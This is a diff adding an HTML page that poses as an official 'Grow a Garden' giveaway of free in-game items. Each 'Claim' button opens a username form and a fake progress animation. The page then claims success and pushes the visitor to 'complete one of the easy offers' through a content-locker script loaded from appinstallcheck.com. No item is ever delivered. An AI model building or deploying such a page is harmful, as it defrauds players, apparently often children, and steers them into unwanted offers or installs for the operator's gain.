@@ -1,1 +1,838 @@
-yarebi tsehl elih
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grow a Garden Official</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+        
+        .background {
+            position: fixed;  
+            top: 0;
+            left: 0;
+            width: 120%;
+            height: 100%;
+            background-image: url('https://www2.0zz0.com/2025/06/13/15/637154608.png');
+            background-size: cover;
+            background-position: center;
+            filter: blur(2px) brightness(0.8);
+            backdrop-filter: blur(80px);
+            animation: slideBackground 20s linear infinite;
+            z-index: -1;
+        }
+        
+        @keyframes slideBackground {
+            0% { transform: translateX(0px); }
+            100% { transform: translateX(-100px); }
+        }
+        
+        .container {
+            position: relative;
+            z-index: 1;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo-container {
+            margin: 20px 0;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .title-3d {
+            font-size: 3.5rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #feca57);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 
+                2px 2px 0 #ff6b6b,
+                4px 4px 0 #4ecdc4,
+                6px 6px 0 #45b7d1,
+                8px 8px 0 #feca57,
+                10px 10px 20px rgba(0,0,0,0.5);
+            margin-bottom: 20px;
+            letter-spacing: 3px;
+            animation: glow3d 3s ease-in-out infinite alternate;
+            position: relative;
+        }
+        
+        @keyframes glow3d {
+            from { 
+                text-shadow: 
+                    2px 2px 0 #ff6b6b,
+                    4px 4px 0 #4ecdc4,
+                    6px 6px 0 #45b7d1,
+                    8px 8px 0 #feca57,
+                    10px 10px 20px rgba(0,0,0,0.5);
+            }
+            to { 
+                text-shadow: 
+                    2px 2px 0 #ff6b6b,
+                    4px 4px 0 #4ecdc4,
+                    6px 6px 0 #45b7d1,
+                    8px 8px 0 #feca57,
+                    10px 10px 40px rgba(255,255,255,0.8),
+                    0 0 30px rgba(255,255,255,0.6);
+            }
+        }
+        
+        .subtitle {
+            color: #fff;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
+            letter-spacing: 1px;
+        }
+        
+        .logo {
+            width: 200px;
+            height: 200px;
+            border-radius: 20px;
+            border: 4px solid transparent;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff9ff3) border-box;
+            animation: shimmer 3s ease-in-out infinite;
+            position: relative;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+        
+        .logo::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: rotate(45deg);
+            animation: shine 2s linear infinite;
+        }
+        
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 16px;
+        }
+        
+        @keyframes shimmer {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 107, 107, 0.5); }
+            16% { box-shadow: 0 0 20px rgba(78, 205, 196, 0.5); }
+            33% { box-shadow: 0 0 20px rgba(69, 183, 209, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(150, 206, 180, 0.5); }
+            66% { box-shadow: 0 0 20px rgba(254, 202, 87, 0.5); }
+            83% { box-shadow: 0 0 20px rgba(255, 159, 243, 0.5); }
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .items-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 30px;
+            max-width: 900px;
+            margin: 50px 0;
+            padding: 0 20px;
+        }
+        
+        .item-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: floatUpDown 3s ease-in-out infinite;
+        }
+        
+        .item-card:nth-child(even) {
+            animation: floatUpDown 3s ease-in-out infinite reverse;
+        }
+        
+        @keyframes floatUpDown {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .item-card:hover {
+            transform: translateY(-10px) scale(1.05);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .item-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 15px;
+            margin: 0 auto 20px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .item-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+        
+        .item-card:hover .item-image img {
+            transform: scale(1.1);
+        }
+        
+        .free-text {
+            color: #4ecdc4;
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .claim-btn {
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+            animation: wiggle 2s ease-in-out infinite;
+        }
+        
+        @keyframes wiggle {
+            0%, 50%, 100% { transform: rotate(0deg); }
+            10%, 30% { transform: rotate(-3deg); }
+            20%, 40% { transform: rotate(3deg); }
+        }
+        
+        .claim-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+        
+        .claim-btn:hover::before {
+            left: 100%;
+        }
+        
+        .claim-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(45deg, #4ecdc4, #ff6b6b);
+            animation: none;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.2));
+            backdrop-filter: blur(20px);
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            text-align: center;
+            min-width: 400px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .modal h2 {
+            color: white;
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+        }
+        
+        .modal input {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 1rem;
+            backdrop-filter: blur(10px);
+        }
+        
+        .modal input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .modal button {
+            background: linear-gradient(45deg, #4ecdc4, #45b7d1);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .modal button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .loading-container {
+            display: none;
+            text-align: center;
+            color: white;
+        }
+        
+        .circular-progress {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, #4ecdc4 0%, #4ecdc4 var(--progress, 0%), transparent var(--progress, 0%));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px auto;
+            position: relative;
+        }
+        
+        .circular-progress::before {
+            content: attr(data-progress) '%';
+            position: absolute;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: white;
+        }
+        
+        .loading-text {
+            font-size: 1.1rem;
+            margin: 15px 0;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .avatar-container {
+            display: none;
+            text-align: center;
+            color: white;
+        }
+        
+        .avatar {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            margin: 20px auto;
+            border: 4px solid #4ecdc4;
+            box-shadow: 0 0 30px rgba(78, 205, 196, 0.5);
+            animation: avatarGlow 2s ease-in-out infinite alternate;
+        }
+        
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+        
+        @keyframes avatarGlow {
+            from { box-shadow: 0 0 30px rgba(78, 205, 196, 0.5); }
+            to { box-shadow: 0 0 50px rgba(78, 205, 196, 0.8); }
+        }
+        
+        .success-text {
+            font-size: 1.8rem;
+            margin: 20px 0 10px 0;
+            background: linear-gradient(45deg, #feca57, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .restart-text {
+            font-size: 1.3rem;
+            margin: 10px 0 20px 0;
+            color: #4ecdc4;
+            font-weight: 600;
+        }
+        
+        @media (max-width: 768px) {
+            .title-3d {
+                font-size: 2.5rem;
+                letter-spacing: 2px;
+            }
+            
+            .logo {
+                width: 180px;
+                height: 180px;
+            }
+            
+            .items-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 20px;
+                max-width: 600px;
+            }
+            
+            .modal-content {
+                min-width: 300px;
+                margin: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .items-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 15px;
+            }
+            
+            .item-image {
+                width: 120px;
+                height: 120px;
+            }
+        }
+    </style>
+    
+    
+    <script type="text/javascript" id="ogjs" src="https://appinstallcheck.com/cl/js/j6kv3p"></script>
+</head>
+<body>
+    <div class="background"></div>
+    
+    <div class="container">
+        <div class="logo-container">
+            <h1 class="title-3d">Grow a Garden Official</h1>
+            <div class="logo">
+                <img src="https://www2.0zz0.com/2025/06/06/20/655609100.jpg" alt="Logo">
+            </div>
+            <p class="subtitle">Choose what you need</p>
+        </div>
+        
+        <div class="items-grid">
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/05/10/137407139.png" alt="Item 1">
+                </div>
+                <div class="free-text">Candy Blossom</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+<div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/07/05/15/483423116.png" alt="Item 2">
+                </div>
+                <div class="free-text">Burning Bud</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/07/05/00/155408724.png" alt="Item 2">
+                </div>
+                <div class="free-text">Summer Seed Pack</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/07/05/00/974430573.png" alt="Item 2">
+                </div>
+                <div class="free-text">Premium Seed Pack</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/07/05/00/910679746.png" alt="Item 2">
+                </div>
+                <div class="free-text">Super Seed</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/28/16/525905630.png" alt="Item 3">
+                </div>
+                <div class="free-text">Moon Cat</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/11/13/139420578.png" alt="Item 4">
+                </div>
+                <div class="free-text">Beanstalk</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/28/17/112986830.png" alt="Item 5">
+                </div>
+                <div class="free-text">Dragonfly</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/07/02/11/525272052.png" alt="Item 6">
+                </div>
+                <div class="free-text">Disco Bee</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/30/14/689684175.png" alt="Item 6">
+                </div>
+                <div class="free-text">Master Sprinkler</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/07/01/00/600779316.png" alt="Item 7">
+                </div>
+                <div class="free-text">Raccoon</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/28/17/666201999.png" alt="Item 8">
+                </div>
+                <div class="free-text">Pig</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://www2.0zz0.com/2025/06/28/16/103172390.png" alt="Item 9">
+                </div>
+                <div class="free-text">Sugar Apple</div>
+                <button class="claim-btn" onclick="playClickSound(); openModal()">Claim</button>
+            </div>
+            <div class="item-card">
+                <div class="item-image">
+                    <img src="https://static.wikia.nocookie.net/growagarden/images/7/72/Ember_Lily_Produce.png" alt="Item 10">
+                </div>
+                <div class="free-text">Ember Lily</div>
+                <button class="claim-btn" onclick="playClicksound(); openModal()">Claim</button>
+            </div>
+
+        </div>
+    </div>
+    
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <div id="username-form">
+                <h2>Enter Your Username</h2>
+                <input type="text" id="username" placeholder="Your username..." maxlength="20">
+                <br>
+                <button onclick="playNextSound(); startLoading()">Next</button>
+                <button onclick="playCloseSound(); closeModal()">Cancel</button>
+            </div>
+            
+            <div id="loading-container" class="loading-container">
+                <div class="circular-progress" id="progress" data-progress="0"></div>
+                <div class="loading-text" id="loading-text">Preparing your exclusive item...</div>
+            </div>
+            
+            <div id="avatar-container" class="avatar-container">
+                <div class="avatar">
+                    <img src="https://www2.0zz0.com/2025/06/29/14/268580304.png" alt="Avatar">
+                </div>
+                <div class="success-text">Congratulations, you've got it!</div>
+                <div class="restart-text">The last step is to complete one of the easy offers. Press the 'Verify' button.</div>
+                <button onclick="og_load();">Verify</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Audio Context for sound effects
+        let audioContext;
+        
+        // Initialize audio context on first user interaction
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+        }
+        
+        // Play a cheerful click sound
+        function playClickSound() {
+            initAudio();
+            
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            // Create a happy click sound
+            oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+            oscillator.frequency.exponentialRampToValueAtTime(1200, audioContext.currentTime + 0.1);
+            oscillator.frequency.exponentialRampToValueAtTime(600, audioContext.currentTime + 0.2);
+            
+            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+            
+            oscillator.type = 'sine';
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.3);
+        }
+        
+        // Play an uplifting "next" sound
+        function playNextSound() {
+            initAudio();
+            
+            const oscillator1 = audioContext.createOscillator();
+            const oscillator2 = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator1.connect(gainNode);
+            oscillator2.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            // Harmonious chord progression
+            oscillator1.frequency.setValueAtTime(523, audioContext.currentTime); // C5
+            oscillator1.frequency.setValueAtTime(659, audioContext.currentTime + 0.2); // E5
+            oscillator1.frequency.setValueAtTime(784, audioContext.currentTime + 0.4); // G5
+            
+            oscillator2.frequency.setValueAtTime(392, audioContext.currentTime); // G4
+            oscillator2.frequency.setValueAtTime(494, audioContext.currentTime + 0.2); // B4
+            oscillator2.frequency.setValueAtTime(588, audioContext.currentTime + 0.4); // D5
+            
+            gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.6);
+            
+            oscillator1.type = 'triangle';
+            oscillator2.type = 'sine';
+            
+            oscillator1.start(audioContext.currentTime);
+            oscillator2.start(audioContext.currentTime);
+            oscillator1.stop(audioContext.currentTime + 0.6);
+            oscillator2.stop(audioContext.currentTime + 0.6);
+        }
+        
+        // Play a gentle close sound
+        function playCloseSound() {
+            initAudio();
+            
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.frequency.setValueAtTime(400, audioContext.currentTime);
+            oscillator.frequency.exponentialRampToValueAtTime(200, audioContext.currentTime + 0.3);
+            
+            gainNode.gain.setValueAtTime(0.15, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+            
+            oscillator.type = 'sine';
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.3);
+        }
+        
+        // Play a success sound during loading
+        function playLoadingSound() {
+            initAudio();
+            
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            // Gentle beep sound
+            oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+            
+            gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
+            
+            oscillator.type = 'sine';
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.1);
+        }
+        
+        // Play a victory fanfare sound
+        function playVictorySound() {
+            initAudio();
+            
+            // Create multiple oscillators for a rich victory sound
+            const frequencies = [523, 659, 784, 1047]; // C major chord with octave
+            const oscillators = [];
+            const gainNode = audioContext.createGain();
+            
+            frequencies.forEach((freq, index) => {
+                const osc = audioContext.createOscillator();
+                osc.connect(gainNode);
+                osc.frequency.setValueAtTime(freq, audioContext.currentTime);
+                osc.type = 'triangle';
+                osc.start(audioContext.currentTime + index * 0.1);
+                osc.stop(audioContext.currentTime + 1 + index * 0.1);
+                oscillators.push(osc);
+            });
+            
+            gainNode.connect(audioContext.destination);
+            gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1.5);
+        }
+        
+        // Play verify button sound
+        function playVerifySound() {
+            initAudio();
+            
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            // Confident verification sound
+            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
+            oscillator.frequency.setValueAtTime(1200, audioContext.currentTime + 0.1);
+            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.2);
+            
+            gainNode.gain.setValueAtTime(0.25, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
+            
+            oscillator.type = 'square';
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.4);
+        }
+        
+        function openModal() {
+            document.getElementById('modal').style.display = 'block';
+            document.getElementById('username-form').style.display = 'block';
+            document.getElementById('loading-container').style.display = 'none';
+            document.getElementById('avatar-container').style.display = 'none';
+        }
+        
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+            document.getElementById('username').value = '';
+        }
+        
+        function startLoading() {
+            const username = document.getElementById('username').value.trim();
+            if (!username) {
+                alert('Please enter your username!');
+                return;
+            }
+            
+            document.getElementById('username-form').style.display = 'none';
+            document.getElementById('loading-container').style.display = 'block';
+            
+            const progressElement = document.getElementById('progress');
+            const loadingTexts = [
+                "Preparing your exclusive item...",
+                "Please wait, it's almost ready!",
+                "Loading your VIP pass..."
+            ];
+            
+            let progress = 0;
+            let textIndex = 0;
+            
+            const interval = setInterval(() => {
+                progress += 2;
+                progressElement.style.setProperty('--progress', progress + '%');
+                progressElement.setAttribute('data-progress', progress);
+                
+                // Play loading sound every 25%
+                if (progress % 25 === 0 && progress > 0) {
+                    playLoadingSound();
+                }
+                
+                if (progress % 33 === 0 && textIndex < loadingTexts.length) {
+                    document.getElementById('loading-text').textContent = loadingTexts[textIndex];
+                    textIndex++;
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        playVictorySound(); // Play victory sound when loading completes
+                        document.getElementById('loading-container').style.display = 'none';
+                        document.getElementById('avatar-container').style.display = 'block';
+                    }, 500);
+                }
+            }, 100);
+        }
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('modal');
+            if (event.target === modal) {
+                playCloseSound();
+                closeModal();
+            }
+        }
+        
+        // Add keyboard support
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape') {
+                playCloseSound();
+                closeModal();
+            }
+            if (event.key === 'Enter' && document.getElementById('username-form').style.display !== 'none') {
+                playNextSound();
+                startLoading();
+            }
+        });
+        
+        // Initialize audio on first user interaction
+        document.addEventListener('click', initAudio, { once: true });
+        document.addEventListener('keydown', initAudio, { once: true });
+    </script>
+</body>
+</html>
